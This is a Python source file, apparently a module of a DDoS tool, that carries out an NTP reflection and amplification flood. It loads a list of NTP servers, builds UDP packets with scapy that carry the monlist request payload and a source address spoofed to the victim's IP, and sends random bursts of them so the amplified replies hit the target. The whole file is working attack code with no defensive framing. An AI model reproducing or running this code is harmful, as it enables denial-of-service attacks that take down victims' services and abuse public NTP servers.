# Import modules
import random
from socket import gaierror
from rich.console import Console
from bin.addons.utils import __path
from scapy.all import IP, send, Raw, UDP

# Define styled print
print = Console().print
red = "red3"
green = "green1"
pink = "magenta3"
yellow = "yellow1"

# Load NTP servers list
with open(__path("bin", "config", "ntp_servers.txt"), "r") as f:
    ntp_servers = f.readlines()

# Payload
payload = "\x17\x00\x03\x2a" + "\x00" * 4


def flood(target):
    server = random.choice(ntp_servers)
    # Packet
    packets = random.randint(10, 150)
    server = server.replace("\n", "")

    try:
        packet = (
            IP(dst=server, src=target[0])
            / UDP(sport=random.randint(2000, 65535), dport=int(target[1]))
            / Raw(load=payload)
        )
        send(packet, count=packets, verbose=False)
    except gaierror:
        print(f"[{red}][!] [{pink}]NTP server {server} is offline![/{red}]")
    except Exception as e:
        print(f"[{red}]Error while sending NTP packet\n{e}[/{red}]")
    else:
        print(
            f"[{green}][+] [{yellow}]Sending {packets} packets from NTP server {server} to {'{}:{}'.format(*target)}.[/{green}]"
        )
